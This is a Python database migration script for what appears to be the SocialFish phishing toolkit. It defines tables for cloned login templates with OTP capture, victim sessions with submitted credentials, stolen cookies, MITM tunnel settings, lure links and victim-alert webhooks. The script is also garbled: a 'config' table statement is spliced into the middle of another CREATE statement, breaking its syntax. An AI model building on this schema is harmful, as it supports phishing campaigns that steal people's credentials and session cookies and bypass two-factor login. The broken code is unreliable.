#!/usr/bin/env python3
"""
Database schema migration for SocialFish v3.0
Adds tables for Playwright recorder, templates, sessions, webhooks, cookies, and MITM config.
"""

import sqlite3
import os
from datetime import datetime

def migrate_db(database_path):
    """Initialize or migrate database to latest schema"""
    
    conn = sqlite3.connect(database_path)
    cur = conn.cursor()
    
    # Enable foreign keys
    cur.execute("PRAGMA foreign_keys = ON")
    conn.commit()
    
    # ============= LEGACY TABLES (keep existing) =============
    
    # Original creds table
    cur.execute("""
        CREATE TABLE IF NOT EXISTS creds (
            id INTEGER PRIMARY KEY,
            url TEXT NOT NULL,
            jdoc TEXT,
            pdate NUMERIC,
            browser TEXT,
            bversion TEXT,
            platform TEXT,
            rip TEXT
        )
    """)
    
    # Original socialfish table
    cur.execute("""
        CREATE TABLE IF NOT EXISTS socialfish (
            id INTEGER PRIMARY KEY,
            clicks INTEGER DEFAULT 0,
            attacks INTEGER DEFAULT 0,
            token TEXT
        )
    """)
    
    # Original sfmail table
    cur.execute("""
        CREATE TABLE IF NOT EXISTS sfmail (
            id INTEGER PRIMARY KEY,
            email VARCHAR,
            smtp TEXT,
            port TEXT
        )
    """)
    
    # Original professionals table
    cur.execute("""
        CREATE TABLE IF NOT EXISTS professionals (
            id INTEGER PRIMARY KEY,
            email VARCHAR,
            name TEXT,

        # Config table - stores site mode and clone URL settings
        cur.execute("""
            CREATE TABLE IF NOT EXISTS config (
                id INTEGER PRIMARY KEY,
                url TEXT,
                status TEXT,
                beef TEXT
            )
        """)
            obs TEXT
        )
    """)
    
    # Original companies table
    cur.execute("""
        CREATE TABLE IF NOT EXISTS companies (
            id INTEGER PRIMARY KEY,
            email VARCHAR,
            name TEXT,
            phone TEXT,
            address TEXT,
            site TEXT
        )
    """)
    
    # ============= NEW TABLES (v3.0+) =============
    
    # Templates - saved cloning configurations
    cur.execute("""
        CREATE TABLE IF NOT EXISTS templates (
            id INTEGER PRIMARY KEY,
            name TEXT NOT NULL UNIQUE,
            base_url TEXT NOT NULL,
            description TEXT,
            tags TEXT,
            clone_mode TEXT DEFAULT 'both',
            browser_engine TEXT DEFAULT 'playwright',
            headless BOOLEAN DEFAULT 1,
            stealth BOOLEAN DEFAULT 1,
            form_selectors TEXT,
            csrf_token_selectors TEXT,
            auth_endpoints TEXT,
            captured_fields TEXT,
            wait_for_otp BOOLEAN DEFAULT 0,
            otp_input_selector TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            created_by TEXT
        )
    """)
    
    # Sessions - victim interactions and credential captures
    cur.execute("""
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY,
            template_id INTEGER,
            session_hash TEXT UNIQUE,
            victim_ip TEXT,
            victim_ua TEXT,
            victim_browser TEXT,
            victim_os TEXT,
            victim_device TEXT,
            victim_platform TEXT,
            victim_geoip TEXT,
            submission_timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            form_data TEXT,
            submitted_credentials TEXT,
            session_state TEXT DEFAULT 'created',
            screenshot_path TEXT,
            notes TEXT,
            FOREIGN KEY (template_id) REFERENCES templates(id)
        )
    """)
    
    # Cookies - detailed cookie capture per session
    cur.execute("""
        CREATE TABLE IF NOT EXISTS cookies (
            id INTEGER PRIMARY KEY,
            session_id INTEGER,
            name TEXT,
            value TEXT,
            domain TEXT,
            path TEXT,
            secure BOOLEAN,
            httponly BOOLEAN,
            samesite TEXT,
            expires TIMESTAMP,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (session_id) REFERENCES sessions(id)
        )
    """)
    
    # Network logs - HTTP requests/responses during recording/replay
    cur.execute("""
        CREATE TABLE IF NOT EXISTS network_logs (
            id INTEGER PRIMARY KEY,
            session_id INTEGER,
            request_method TEXT,
            request_url TEXT,
            request_headers TEXT,
            request_body TEXT,
            response_status INTEGER,
            response_headers TEXT,
            response_body TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (session_id) REFERENCES sessions(id)
        )
    """)
    
    # Screenshots - captured during user interactions
    cur.execute("""
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY,
            session_id INTEGER,
            file_path TEXT,
            step_name TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (session_id) REFERENCES sessions(id)
        )
    """)
    
    # MITM configuration - reverse proxy and tunneling setup
    cur.execute("""
        CREATE TABLE IF NOT EXISTS mitm_config (
            id INTEGER PRIMARY KEY,
            template_id INTEGER,
            tunnel_type TEXT DEFAULT 'none',
            tunnel_token TEXT,
            tunnel_domain TEXT,
            local_port INTEGER DEFAULT 5000,
            loopback_address TEXT DEFAULT 'localhost',
            lure_url TEXT,
            reverse_proxy_enabled BOOLEAN DEFAULT 0,
            intercept_network BOOLEAN DEFAULT 1,
            intercept_cookies BOOLEAN DEFAULT 1,
            redirect_after_capture TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (template_id) REFERENCES templates(id)
        )
    """)
    
    # Webhooks - notification endpoints for victim interactions
    cur.execute("""
        CREATE TABLE IF NOT EXISTS webhooks (
            id INTEGER PRIMARY KEY,
            template_id INTEGER,
            webhook_url TEXT NOT NULL,
            webhook_type TEXT DEFAULT 'json',
            trigger_on TEXT,
            payload_template TEXT,
            enabled BOOLEAN DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (template_id) REFERENCES templates(id)
        )
    """)
    
    # Webhook logs - track webhook delivery
    cur.execute("""
        CREATE TABLE IF NOT EXISTS webhook_logs (
            id INTEGER PRIMARY KEY,
            webhook_id INTEGER,
            session_id INTEGER,
            payload TEXT,
            response_status INTEGER,
            response_body TEXT,
            sent_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (webhook_id) REFERENCES webhooks(id),
            FOREIGN KEY (session_id) REFERENCES sessions(id)
        )
    """)
    
    # Lure URLs - tracking generated phishing links
    cur.execute("""
        CREATE TABLE IF NOT EXISTS lure_urls (
            id INTEGER PRIMARY KEY,
            template_id INTEGER,
            lure_hash TEXT UNIQUE,
            full_url TEXT,
            short_url TEXT,
            click_count INTEGER DEFAULT 0,
            first_click TIMESTAMP,
            last_click TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (template_id) REFERENCES templates(id)
        )
    """)
    
    # Analyzer logs - multi-step, 2FA, and flow detection
    cur.execute("""
        CREATE TABLE IF NOT EXISTS analyzer_logs (
            id INTEGER PRIMARY KEY,
            session_id INTEGER,
            detection_type TEXT,
            detection_value TEXT,
            confidence REAL,
            detected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (session_id) REFERENCES sessions(id)
        )
    """)
    
    # Tunnel management - active tunnel sessions
    cur.execute("""
        CREATE TABLE IF NOT EXISTS tunnel_sessions (
            id INTEGER PRIMARY KEY,
            template_id INTEGER,
            tunnel_type TEXT,
            tunnel_pid INTEGER,
            tunnel_url TEXT,
            started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            ended_at TIMESTAMP,
            FOREIGN KEY (template_id) REFERENCES templates(id)
        )
    """)
    
    conn.commit()
    conn.close()
    print(f"[+] Database migrated successfully: {database_path}")

if __name__ == "__main__":
    db_path = os.getenv("DATABASE", "./database.db")
    migrate_db(db_path)
